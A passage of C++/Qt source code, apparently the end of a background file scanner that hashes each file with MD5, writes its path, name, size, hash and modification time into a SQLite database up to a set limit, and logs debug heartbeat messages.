            if (seenPaths.contains(absPath)) continue;
            seenPaths.insert(absPath);

            // Calculate MD5
            QString md5 = "";
            QFile file(info.absoluteFilePath());
            if (file.open(QIODevice::ReadOnly)) {
                QCryptographicHash hash(QCryptographicHash::Md5);
                if (hash.addData(&file)) {
                    md5 = hash.result().toHex();
                }
                file.close();
            }
            
            sqlite3_bind_text(stmt, 1, info.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 2, info.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 3, info.size());
            sqlite3_bind_text(stmt, 4, md5.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 5, info.lastModified().toSecsSinceEpoch());
            sqlite3_step(stmt);
            sqlite3_reset(stmt);
            
            count++;
            if (count > limit) {
                Logs::writeMain("HEARTBEAT_DEBUG: Hit limit " + QString::number(limit) + " for path " + path);
                break;
            }
        }
    }

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    
    Logs::writeMain("HEARTBEAT_DEBUG: BackgroundScanner::process finished.");
    Q_EMIT scanFinished(_taskId, "Scan Completed");
}

} // namespace Core
